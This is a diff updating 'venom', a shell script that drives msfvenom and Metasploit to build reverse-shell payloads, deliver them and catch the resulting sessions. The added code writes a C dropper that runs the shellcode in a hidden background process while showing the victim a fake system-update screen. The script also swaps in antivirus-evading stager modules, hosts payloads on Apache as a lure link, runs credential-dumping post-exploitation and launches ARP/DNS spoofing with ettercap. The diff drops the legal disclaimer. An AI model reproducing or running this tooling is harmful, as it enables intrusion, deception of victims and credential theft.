@@ -1,9 +1,9 @@
 #!/bin/sh
 # --------------------------------------------------------------
 # venom - metasploit Shellcode generator/compiler/listenner
-# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.15
-# Suspicious-Shell-Activity (SSA) RedTeam develop @2017
-# codename: Pandora's box (pithos) [ GPL licensed ]
+# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.0.16
+# Suspicious-Shell-Activity (SSA) RedTeam develop @2017 - 2019
+# codename: aconitum_nappelus [ GPL licensed ]
 # --------------------------------------------------------------
 # [DEPENDENCIES]
 # "venom.sh will download/install all dependencies as they are needed"
@@ -15,35 +15,43 @@
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
 resize -s 40 92 > /dev/null
-# inicio
 
 
 
 
-
-
-# ---------------------
+# --------------------
 # check if user is root
 # ---------------------
 if [ $(id -u) != "0" ]; then
   echo "[x] we need to be root to run this script..."
   echo "[x] execute [ sudo ./venom.sh ] on terminal"
   exit
-else
-  :
 fi
 
 
+# -----------------------------------
+# Colorise shell Script output leters
+# -----------------------------------
+Colors() {
+Escape="\033";
+  white="${Escape}[0m";
+  RedF="${Escape}[31m";
+  GreenF="${Escape}[32m";
+  YellowF="${Escape}[33m";
+  BlueF="${Escape}[34m";
+  CyanF="${Escape}[36m";
+Reset="${Escape}[0m";
+}
 
 
-
+Colors;
 # ----------------------
 # variable declarations
 # ----------------------
 OS=`uname` # grab OS
 H0m3=`echo ~` # grab home path
-ver="1.0.15" # script version display
-C0d3="Pandora's box (pithos)" # version codename display
+ver="1.0.16" # script version display
+C0d3="aconitum_nappelus" # version codename display
 user=`who | awk {'print $1'}` # grab username
 # user=`who | cut -d' ' -f1 | sort | uniq` # grab username
 DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
@@ -71,8 +79,6 @@ InJEc15="$IPATH/templates/exec_psh.c" # c script path
 InJEc16="$IPATH/templates/exec.jar" # jar script path
 
 
-
-
 # -------------------------------------------
 # SETTINGS FILE FUNTION (venom-main/settings)
 # -------------------------------------------
@@ -90,23 +96,28 @@ UUID_RANDOM_LENGTH="70" # build 23 uses random keys (comments) to evade signatur
 EnV=`hostnamectl | grep Chassis | awk {'print $2'}` > /dev/null 2>&1
 
 
-#
-# Config user system correct arch (wine)
-#
+# --------------------------------------------
+# Config user system correct arch (wine+mingw)
+# --------------------------------------------
 if [ "$ArCh" = "x86" ]; then
   arch="wine"
   ComP="i586-mingw32msvc-gcc"
-else
+elif [ "$ArCh" = "x64" ]; then
   arch="wine64"
   ComP="i686-w64-mingw32-gcc"
+else
+  echo ${RedF}[x]${white} ERROR: Wrong value input: [ $ArCh ]: not accepted ..${Reset}
+  echo ${RedF}[x]${white} Edit [ settings ] File and Set the var: SYSTEM_ARCH= ${Reset}
+  sleep 3
+  exit
 fi
-
 
 
 # -----------------------------------------
 # msf postgresql database connection check?
 # -----------------------------------------
 if [ "$ChEk" = "ON" ]; then
+echo ${BlueF}
 cat << !
     ╔─────────────────────────────────────────────────╗
     |  postgresql metasploit database connection fix  |
@@ -117,30 +128,29 @@ cat << !
   # start msfconsole to check postgresql connection status
   #
   service postgresql start
-  echo "[*] Checking msfdb connection status .."
+  echo ${BlueF}[☠]${white} Checking msfdb connection status ..${Reset}
   ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
   if [ "$ih" != "connected" ]; then
-    echo "[x] postgresql selected, no connection .."
-    echo "[*] Please wait, rebuilding msf database .."
+    echo ${RedF}[x]${white} postgresql selected, no connection ..${Reset}
+    echo ${BlueF}[☠]${white} Please wait, rebuilding msf database ..${Reset}
     # rebuild msf database (database.yml)
     echo ""
     msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
     echo ""
-    echo "[✔] postgresql connected to msf .."
+    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}
     sleep 2
   else
-    echo "[✔] postgresql connected to msf .."
+    echo ${BlueF}[✔]${white} postgresql connected to msf ..${Reset}
     sleep 2
   fi
 fi
-
-
 
 
 # -----------------------------------------------
 # update metasploit database before running tool?
 # -----------------------------------------------
 if [ "$MsFu" = "ON" ]; then
+echo ${BlueF}
 cat << !
     ╔─────────────────────────────────────────────────╗
     | please wait fetching latest metasploit modules  |
@@ -150,11 +160,11 @@ cat << !
 fi
 
 
-
 # -----------------------------------------------
 # venom framework configurated to store logfiles?
 # -----------------------------------------------
 if [ "$MsFlF" = "ON" ]; then
+echo ${BlueF}
 cat << !
     ╔─────────────────────────────────────────────────╗
     | venom framework configurated to store logfiles  |
@@ -162,7 +172,6 @@ cat << !
 !
 sleep 2
 fi
-
 
 
 # ---------------------------------------------
@@ -183,42 +192,31 @@ case $DiStR0 in
 clear
 
 
-
-
-
 # ------------------------------------
 # end of script internal settings and
 # display credits befor running module
 # ------------------------------------
-cat << !
-
+#                  - CodeName: $C0d3 -
+echo ${BlueF} && clear && cat << !
+                              
                __    _ ______  ____   _  _____  ____    __  
               \  \  //|   ___||    \ | |/     \|    \  /  |
                \  \// |   ___||     \| ||     ||     \/   |
                 \__/  |______||__/\____|\_____/|__/\__/|__|
-                  |S|h|e|l|l|c|0|d|e| |G|e|n|e|r|a|t|0|r|
-                    - CodeName: $C0d3 -
 !
+echo "${RedF}    Shellcode_Generator${white}::${RedF}CodeName${white}::${RedF}$C0d3${white}::${RedF}SSA(redteam)2019${BlueF}"
 echo "    ╔────────────────────────────────────────────────────────────────╗"
-echo "    |  The author does not hold any responsibility for the bad use   |"
-echo "    |  of this tool, remember that attacking targets without prior   |"
-echo "    |  consent is illegal and punished by law.                       |"
-echo "    |                                                                |"
-echo "    |  The main goal of this tool its not to build 'FUD' payloads!   |"
-echo "    |  But to give to its users the first glance of how shellcode is |"
-echo "    |  build, embedded into one template (any language), obfuscated  |"
-echo "    |  (e.g pyherion.py) and compiled into one executable file.      |"
-echo "    |  'reproducing technics found in Veil,Unicorn,powersploit'      |"
+echo "    |  ${YellowF}The main goal of this tool its not to build 'FUD' payloads!${BlueF}   |"
+echo "    |  ${YellowF}But to give to its users the first glance of how shellcode is${BlueF} |"
+echo "    |  ${YellowF}build, embedded into one template (any language), obfuscated${BlueF}  |"
+echo "    |  ${YellowF}(e.g pyherion.py) and compiled into one executable file.${BlueF}      |"
 echo "    ╠────────────────────────────────────────────────────────────────╝"
 echo "    | Author:r00t-3xp10it | Suspicious_Shell_Activity (red_team)"
-echo "    ╘ VERSION:$ver USER:$user INTERFACE:$InT3R ARCH:$ArCh DISTRO:$DiStR0"
+echo "    ╘ VERSION:${YellowF}$ver ${BlueF}USER:${YellowF}$user ${BlueF}INTERFACE:${YellowF}$InT3R ${BlueF}ARCH:${YellowF}$ArCh ${BlueF}DISTRO:${YellowF}$DiStR0"${Reset}
 echo "" && echo ""
 sleep 1
-echo "[☠] Press [ENTER] to continue .."
+echo ${BlueF}[☠]${white} Press [${GreenF} ENTER ${white}] to continue ..${Reset}
 read op
-clear
-
-
 
 
 # -----------------------------------------
@@ -229,27 +227,25 @@ if [ "$?" -eq "0" ]; then
 echo "msfconsole found" > /dev/null 2>&1
 else
 echo ""
-echo "[☠] msfconsole -> not found!"
-echo "[☠] This script requires msfconsole to work!"
+echo ${RedF}[x]${white} msfconsole -> not found!${Reset}
+echo ${BlueF}[☠]${white} This script requires msfconsole to work!${Reset}
 sleep 2
 exit
 fi
-
 
 apc=`which apache2`
 if [ "$?" -eq "0" ]; then
 echo "apache2 found" > /dev/null 2>&1
 else
 echo ""
-echo "[☠] apache2 -> not found!"
-echo "[☠] This script requires apache2 to work!"
+echo ${RedF}[x]${white} apache2 -> not found!${Reset}
+echo ${BlueF}[☠]${white} This script requires apache2 to work!${Reset}
 sleep 2
 echo ""
-echo "[☠] Please run: cd aux && sudo ./setup.sh"
-echo "[☠] to install all missing dependencies..."
+echo ${BlueF}[☠]${white} Please run: cd aux && sudo ./setup.sh${Reset}
+echo ${BlueF}[☠]${white} to install all missing dependencies...${Reset}
 exit
 fi
-
 
 
 # --------------------------------------------
@@ -265,9 +261,6 @@ fi
 clear
 
 
-
-
-
 # -----------------------------------------------
 # arno0x0x meterpreter loader random bytes stager
 # -----------------------------------------------
@@ -275,11 +268,10 @@ Chts=`cat settings | egrep -m 1 "RANDOM_STAGER_BYTES" | cut -d '=' -f2` > /dev/n
 ArNo=`cat settings | egrep -m 1 "METERPRETER_STAGER" | cut -d '=' -f2` > /dev/null 2>&1
 if [ "$Chts" = "ON" ]; then
   if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
-    echo "[✔] arno0x0x meterpreter loader random bytes stager: active .."
+    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}
     sleep 2
-
   else
-
+echo ${BlueF}
 cat << !
     ╔─────────────────────────────────────────────────────────────────────╗
     |  arno0x0x meterpreter_loader random bytes stager av bypass technic  |
@@ -293,30 +285,27 @@ cat << !
 !
 sleep 2
     # backup msf modules
-    echo "[☠] Backup default msf modules .."
+    echo ${BlueF}[☠]${white} Backup default msf modules ..${Reset}
     sleep 1
     echo "$ArNo/meterpreter_loader.rb"
     cp $ArNo/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader.rb
     echo "$ArNo/x64/meterpreter_loader.rb"
     cp $ArNo/x64/meterpreter_loader.rb $IPATH/obfuscate/meterpreter_loader_64.rb
     # replace default modules
-    echo "[☠] Replace default modules by venom modules .."
+    echo ${BlueF}[☠]${white} Replace default modules by venom modules ..${Reset}
     sleep 1
     cp $IPATH/aux/msf/meterpreter_loader.rb $ArNo/meterpreter_loader.rb > /dev/null 2>&1
     cp $IPATH/aux/msf/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb > /dev/null 2>&1
     # start postgresql + reload msfdb
-    echo "[☠] Rebuild/Reload msf database .."
+    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}
     sleep 1
     msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
     msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
-    echo "[✔] arno0x0x meterpreter loader random bytes stager: active .."
+    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: active ..${Reset}
     sleep 2
   fi
 fi
 clear
-
-
-
 
 
 # ----------------------------------
@@ -324,9 +313,9 @@ clear
 # ----------------------------------
 trap ctrl_c INT
 ctrl_c() {
-echo "[☠] CTRL+C PRESSED -> ABORTING TASKS!"
+echo "${RedF}[x]${white} CTRL+C PRESSED -> ABORTING TASKS!"${Reset}
 sleep 1
-echo "[☠] Cleanning temp generated files..."
+echo ${BlueF}[☠]${white} Cleanning temp generated files...${Reset}
 # just in case :D !!!
 # revert [templates] backup files to default stages
 mv $IPATH/templates/exec[bak].c $InJEc > /dev/null 2>&1
@@ -383,9 +372,8 @@ rm $ApAcHe/shell.exe > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.rtf > /dev/null 2>&1
 # exit venom.sh
-echo "[☠] Exit Shellcode Generator..."
-echo "[_Codename:$C0d3]"
-echo "☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆"
+echo ${BlueF}[☠]${white} Exit Shellcode Generator...${Reset}
+echo ${BlueF}[☠]${white} [_Codename:$C0d3]${Reset}
 sleep 1
 if [ "$DiStR0" = "Kali" ]; then
 service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
@@ -398,42 +386,36 @@ cd $IPATH
 cd ..
 sudo chown -hR $user shell > /dev/null 2>&1
 
-#
+
+# -----------------------
 # arno0x0x av obfuscation
-#
+# ----------------------
 if [ "$Chts" = "ON" ]; then
   if [ -e "$IPATH/obfuscate/meterpreter_loader.rb" ]; then
     # backup msf modules
-    echo "[✔] arno0x0x meterpreter loader random bytes stager: revert .."
-    echo "[☠] Revert default msf modules .."
+    echo ${BlueF}[${GreenF}✔${BlueF}]${white} arno0x0x meterpreter loader random bytes stager: revert ..${Reset}
+    echo ${BlueF}[☠]${white} Revert default msf modules ..${Reset}
     sleep 1
     cp $IPATH/obfuscate/meterpreter_loader.rb $ArNo/meterpreter_loader.rb
     cp $IPATH/obfuscate/meterpreter_loader_64.rb $ArNo/x64/meterpreter_loader.rb
     rm $IPATH/obfuscate/meterpreter_loader.rb
     rm $IPATH/obfuscate/meterpreter_loader_64.rb
     # reload msfdb
-    echo "[☠] Rebuild/Reload msf database .."
+    echo ${BlueF}[☠]${white} Rebuild/Reload msf database ..${Reset}
     sleep 1
     msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
     msfconsole -q -x 'reload_all; exit -y' | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Reload metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
   else
-    echo "[*] no backup msf modules found.."
+    echo ${RedF}[x]${white} no backup msf modules found..${Reset}
     sleep 2
   fi
 fi
-
 exit
 }
 
 
 
-
-
 # -------------------------------------------------END OF SCRIPT SETTINGS------------------------------------->
-
-
-
-
 
 
 
@@ -444,7 +426,7 @@ exit
 # ---------------------------------------------
 sh_shellcode1 () {
 # get user input to build shellcode
-echo "[☠] Enter shellcode settings!"
+echo ${BlueF}[☠]${white} Enter shellcode settings!${Reset}
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
 if [ "$?" -eq "0" ]; then
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
@@ -452,12 +434,11 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "linux/x64/shell/reverse_tcp" FALSE "linux/x64/shell_reverse_tcp" FALSE "linux/x64/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "osx/x64/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "bsd/x64/shell_reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 460) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-echo "[☠] editing/backup files..."
+echo ${BlueF}[☠]${white} editing/backup files...${Reset};
 
 
-echo "[☠] Building shellcode -> C format ..."
+echo "${BlueF}[☠]${white} Building shellcode -> C format ..."${Reset};
 sleep 2
-echo "" > $IPATH/output/chars.raw
 # display final settings to user
 cat << !
 
@@ -465,85 +446,118 @@ cat << !
     ╔─────────────────────
     | LPORT   : $lport
     | LHOST   : $lhost
+    | NAME    : $N4m
     | FORMAT  : C -> UNIX
     |_PAYLOAD : $paylo
 
 !
 
 # use metasploit to build shellcode
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c > $IPATH/output/chars.raw"
-
-
-
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c -o $IPATH/output/chars.raw"
 echo ""
 # display generated shelcode
 cat $IPATH/output/chars.raw
-echo "" && echo ""
+echo ""
 sleep 2
+# parsing shellcode data
+cmd=$(cat $IPATH/output/chars.raw | grep -v "=")
+
 
    # check if all dependencies needed are installed
-   # chars.raw | exec.c | gcc compiler
-   # check if template exists
-   if [ -e $InJEc ]; then
-      echo "[☠] exec.c -> found!"
-      sleep 2
-   else
-      echo "[☠] exec.c -> not found!"
-      exit
-   fi
-
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠] chars.raw -> found!"
-      sleep 2
- 
+      echo "${BlueF}[☠]${white} chars.raw -> found!"${Reset};
+      sleep 2 
    else
-
-      echo "[☠] chars.raw -> not found!"
+      echo "${RedF}[x]${white} chars.raw -> not found!"${Reset};
       exit
-      fi
+   fi
 
    # check if gcc exists
    c0m=`which gcc`> /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
-      echo "[☠] gcc compiler -> found!"
+      echo "${BlueF}[☠]${white} gcc compiler -> found!"${Reset};
       sleep 2
- 
    else
-
-      echo "[☠] gcc compiler -> not found!"
-      echo "[☠] Download compiler -> apt-get install gcc"
+      echo "${RedF}[x]${white} gcc compiler -> not found!"${Reset};
+      echo "${BlueF}[☠]${white} Download compiler -> apt-get install gcc"${Reset};
       echo ""
       sudo apt-get install gcc
       echo ""
-      fi
+   fi
 
 
-# EDITING/BACKUP FILES NEEDED
+## EDITING/BACKUP FILES NEEDED
 cp $InJEc $IPATH/templates/exec[bak].c
 
-   # edit exec.c using leafpad or gedit editor
-   if [ "$DiStR0" = "Kali" ]; then
 
-      leafpad $InJEc > /dev/null 2>&1
-   else
-      gedit $InJEc > /dev/null 2>&1
-   fi
+# -----------------
+# BUILD C TEMPLATE
+# -----------------
+echo "#include<stdio.h>" > $IPATH/output/exec.c
+echo "#include<stdlib.h>" >> $IPATH/output/exec.c
+echo "#include<string.h>" >> $IPATH/output/exec.c
+echo "#include<sys/types.h>" >> $IPATH/output/exec.c
+echo "#include<sys/wait.h>" >> $IPATH/output/exec.c
+echo "#include<unistd.h>" >> $IPATH/output/exec.c
+echo "" >> $IPATH/output/exec.c
+echo "/*" >> $IPATH/output/exec.c
+echo "Author: r00t-3xp10it" >> $IPATH/output/exec.c
+echo "Framework: venom v1.0.16" >> $IPATH/output/exec.c
+echo "gcc -fno-stack-protector -z execstack exec.c -o $N4m" >> $IPATH/output/exec.c
+echo "*/" >> $IPATH/output/exec.c
+echo "" >> $IPATH/output/exec.c
+echo "/* msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f c */" >> $IPATH/output/exec.c
+echo "unsigned char kungfu[] =" >> $IPATH/output/exec.c
+echo "$cmd" >> $IPATH/output/exec.c
+echo "" >> $IPATH/output/exec.c
+echo "int main()" >> $IPATH/output/exec.c
+echo "{" >> $IPATH/output/exec.c
+echo "/*" >> $IPATH/output/exec.c
+echo "This fork(); function allow us to spawn a new child process (in background). This way i can" >> $IPATH/output/exec.c
+echo "execute shellcode in background while continue the execution of the C program in foreground." >> $IPATH/output/exec.c
+echo "Article: https://www.geeksforgeeks.org/zombie-and-orphan-processes-in-c" >> $IPATH/output/exec.c
+echo "*/" >> $IPATH/output/exec.c
+echo "fflush(NULL);" >> $IPATH/output/exec.c
+echo "int pid = fork();" >> $IPATH/output/exec.c
+echo "   if (pid > 0) {" >> $IPATH/output/exec.c
+echo "      /* We are running in parent process (as foreground job). */" >> $IPATH/output/exec.c
+echo "      printf(\"Please Wait, Updating system ..\\\n\\\n\");" >> $IPATH/output/exec.c
+echo "      /* Display system information onscreen to target user */" >> $IPATH/output/exec.c
+echo "      sleep(1);system(\"h=\$(hostnamectl | grep 'Static' | cut -d ':' -f2);echo \\\"Hostname   :\$h\\\"\");" >> $IPATH/output/exec.c
+echo "      system(\"k=\$(hostnamectl | grep 'Kernel' | cut -d ':' -f2);echo \\\"Kernel     :\$k\\\"\");" >> $IPATH/output/exec.c
+echo "      system(\"b=\$(hostnamectl | grep 'Boot' | cut -d ':' -f2);echo \\\"Boot ID    :\$b\\\"\");" >> $IPATH/output/exec.c
+echo "      sleep(2);printf(\"\\\n\");" >> $IPATH/output/exec.c
+echo "      system(\"OP=\$(hostnamectl | grep 'Operating' | awk {'print \$3'});echo \\\"Hit:1 http://\$OP.download/\$OP \$OP-rolling/contrib\\\"\");" >> $IPATH/output/exec.c
+echo "      printf(\"------------------------------------------------------\\\n\");" >> $IPATH/output/exec.c
+echo "      sleep(1);system(\"for i in 1023.8353.9354:/daemon 7384.8400.8112:/etc/apt 3305.6720.2201:/etc/bin 6539.3167.1200:/etc/cron 4739.0473.4370:/etc/systemd 9164.0257.0034:/etc/passwd 1023.2559.0076:/etc/crontab 3945.4401.5037:/etc/fork.sys 4406.4490.2320:/etc/drive.sys 1288.3309.9955:/etc/PSmanager 1992.9909.1234:/etc/synaptic 4856.4845.6677:/etc/sources.list 4400.0079.0001:/etc/shadow;do dt=\$(date|awk {'print \$4,\$5,\$6'});echo \\\"\$dt - PATCHING: \$i\\\" && sleep 1;done\");" >> $IPATH/output/exec.c
+echo "      printf(\"------------------------------------------------------\\\n\");" >> $IPATH/output/exec.c
+echo "      printf(\"Please Wait, finishing update process ..\\\n\");" >> $IPATH/output/exec.c
+echo "      sleep(2);printf(\"Done...\\\n\");" >> $IPATH/output/exec.c
+echo "   }" >> $IPATH/output/exec.c
+echo "   else if (pid == 0) {" >> $IPATH/output/exec.c
+echo "      /* We are running in child process (as backgrond job - orphan). */" >> $IPATH/output/exec.c
+echo "      setsid();" >> $IPATH/output/exec.c
+echo "      void (*ret)() = (void(*)())kungfu;" >> $IPATH/output/exec.c
+echo "      ret();" >> $IPATH/output/exec.c
+echo "  } return 0;" >> $IPATH/output/exec.c
+echo "}" >> $IPATH/output/exec.c
+
 
 cd $IPATH/templates
 # COMPILING SHELLCODE USING GCC
-echo "[☠] Compiling using gcc..."
-gcc -fno-stack-protector -z execstack exec.c -o $N4m
-mv $N4m $IPATH/output/$N4m
+echo "${BlueF}[☠]${white} Compiling using gcc..."${Reset};
+gcc -fno-stack-protector -z execstack $IPATH/output/exec.c -o $IPATH/output/$N4m
 
-# CHOSE HOW TO DELIVER YOUR PAYLOAD
+
+## CHOSE HOW TO DELIVER YOUR PAYLOAD
 serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m\n\nExecute: sudo ./$N4m\n\nchose how to deliver: $N4m" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 305) > /dev/null 2>&1
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠] Start a multi-handler..."
-      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯] Please dont test samples on virus total..."
+      echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
+      echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
+      echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
         if [ "$MsFlF" = "ON" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           cd $IPATH/output
@@ -564,23 +578,21 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
         fi
       sleep 2
 
-
    else
 
 P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "linux_hostrecon.rc" FALSE "dump_credentials_linux.rc" FALSE "exploit_suggester.rc" --width 305 --height 260) > /dev/null 2>&1
 
 
-
 if [ "$P0" = "dump_credentials_linux.rc" ]; then
   if [ -e "$pHanTom/post/linux/gather/wifi_dump_linux.rb" ]; then
-    echo "[✔] wifi_dump_linux.rb -> found"
+    echo ${GreenF}[✔]${white} wifi_dump_linux.rb -> found${Reset};
     sleep 2
   else
-    echo "[x] wifi_dump_linux.rb -> not found"
+    echo ${RedF}[x]${white} wifi_dump_linux.rb -> not found${Reset};
     sleep 1
-    echo "[*] copy post-module to msfdb .."
+    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};
     cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
-    echo "[☠] Reloading msfdb database .."
+    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};
     sleep 2
     xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
     xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
@@ -588,14 +600,14 @@ if [ "$P0" = "dump_credentials_linux.rc" ]; then
 
 elif [ "$P0" = "linux_hostrecon.rc" ]; then
   if [ -e "$pHanTom/post/linux/gather/linux_hostrecon.rb" ]; then
-    echo "[✔] linux_hostrecon.rb -> found"
+    echo ${GreenF}[✔]${white} linux_hostrecon.rb -> found${Reset};
     sleep 2
   else
-    echo "[x] linux_hostrecon.rb -> not found"
+    echo ${RedF}[x]${white} linux_hostrecon.rb -> not found${Reset};
     sleep 1
-    echo "[*] copy post-module to msfdb .."
+    echo ${BlueF}[*]${white} copy post-module to msfdb ..${Reset};
     cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1
-    echo "[☠] Reloading msfdb database .."
+    echo ${BlueF}[☠]${white} Reloading msfdb database ..${Reset};
     sleep 2
     xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
     xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
@@ -608,7 +620,6 @@ echo "nothing to do here" > /dev/null 2>&1
 fi
 
 
-
       # edit files nedded
       cd $IPATH/templates/phishing
       cp $InJEc12 mega[bak].html
@@ -617,7 +628,7 @@ fi
       # copy from output
       cd $IPATH/output
       cp $N4m $ApAcHe/$N4m > /dev/null 2>&1
-      echo "[☠] loading -> Apache2Server!"
+      echo "${BlueF}[☠]${white} loading -> Apache2Server!"${Reset};
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -629,11 +640,11 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠] Start a multi-handler..."
-        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯] Please dont test samples on virus total..."
+        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
+        echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
+        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
           if [ "$MsFlF" = "ON" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
             cd $IPATH/output
             # delete utf-8/non-ancii caracters from output
@@ -649,9 +660,8 @@ fi
             rm report.log > /dev/null 2>&1
             cd $IPATH/
           else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
-
 
         else
 
@@ -659,11 +669,11 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠] Start a multi-handler..."
-        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯] Please dont test samples on virus total..."
+        echo ${BlueF}[☠]${white} Start a multi-handler...${Reset};
+        echo ${YellowF}[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell${Reset};
+        echo ${BlueF}[☯]${white} Please dont test samples on virus total...${Reset};
           if [ "$MsFlF" = "ON" ]; then
